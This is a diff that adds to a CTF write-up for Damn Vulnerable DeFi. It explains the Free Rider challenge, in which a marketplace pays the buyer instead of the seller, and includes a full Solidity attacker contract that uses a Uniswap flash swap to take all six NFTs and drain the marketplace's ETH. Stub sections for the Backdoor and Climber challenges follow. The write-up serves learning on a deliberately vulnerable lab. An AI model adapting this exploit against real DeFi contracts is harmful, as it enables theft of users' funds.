@@ -227,17 +227,85 @@ In this challenge, we must steal million DVT from the pool. This challenge is ve
 ### Challenge category => so users know the chall’s field
 ### Challenge points => so users know the chall’s difficulty
 
-In this challenge, we have to take 6 NFT from marketplace with only 0.5 ether. In addition, NFT is 15 ether worth. We can find the vulnerability in the `_buyOne()` function. Here is the line that is vulnerable.
+In this challenge, we have to take 6 NFT from marketplace with only 0.5 ether. In addition, NFT is 15 ether worth. The vulnerability is in the `_buyOne()` function. Here is the line that is vulnerable.
 
 ```
     token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
     payable(token.ownerOf(tokenId)).sendValue(priceToPay);
 ```
 
-If someone buys NFT, the marketplace transfer the NFT to buyer first. Then send value to token owner, which is now buyer. If only we could get 15 ETH, we can take all NFTs from marketplace. 
+If someone buys NFT, the marketplace transfer the NFT to buyer first. Then send value to token owner, which is now buyer. If only we could get 15 ETH, we can take all NFTs from marketplace. Here is where flash swap is needed. We can get 15 ETH for an instant from __Uniswap__. In `swap()` function in Uniswap pair, we are allow to send data to call `uniswapV2Call()`. We just need to create `uniswapV2Call()` function that buys NFT and return funds to Uniswap pair contract. Here is attack contract.
+
+```solidity
+contract AttackerFreeRider is IUniswapV2Callee {
+
+    IUniswapV2Pair public immutable pair;
+    FreeRiderNFTMarketplace public immutable marketplace;
+    FreeRiderBuyer public immutable partner;
+    address payable public  owner;
+    IERC721 public immutable nft;
+    IWETH public immutable weth;
+
+    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];
+
+    constructor(address _pair, address _nft, address _marketplace, address _partner, address _weth) {
+        pair = IUniswapV2Pair(_pair);
+        nft = IERC721(_nft);
+        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
+        partner = FreeRiderBuyer(_partner);
+        weth = IWETH(_weth);
+        owner = payable(msg.sender);
+    }
+
+    function attackMarketPlace(uint256 amount) public payable {
+        // pair의 swap을 실행시키면 line 33의 uniswapV2Call function 이 실행됨
+        pair.swap(amount, 0, address(this), new bytes(1));
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
+        
+        weth.withdraw(amount0);
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+        
+        weth.deposit{value: 16 ether}();
+        weth.transfer(address(pair), uint(16e18));
+        
+        for(uint256 i=0; i< tokenIds.length; i++) {
+            nft.safeTransferFrom(address(this), address(partner), i);
+        }
+
+        owner.transfer(address(this).balance);
+    }
+
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+
+}
+```
+
+In `uniswapV2Call()` function, first withdraw ETH from WETH contract. Secondly, call `buyMany()` function with 15 ETH. As we buy one NFT with 15 ETH, it will return 15 ETH. Since marketplace have 90 ETH balance, marketplace will pay for our purchase. After buy NFTs, we return ETH to Uniswap. Then send NFT to our partner. It will trigger the partner to transfer 45 ETH that was promised. 
+
+
+- - -
+## CTF name: Damn Vulnerable DeFi
+### Challenge name: Backdoor 
+### Challenge description:
+### Challenge category => so users know the chall’s field
+### Challenge points => so users know the chall’s difficulty
 
 
 
 
+- - -
+## CTF name: Damn Vulnerable DeFi
+### Challenge name: Climber 
+### Challenge description:
+### Challenge category => so users know the chall’s field
+### Challenge points => so users know the chall’s difficulty
 
 
+In this challenge, our goal is to empty the vault. 
+ 
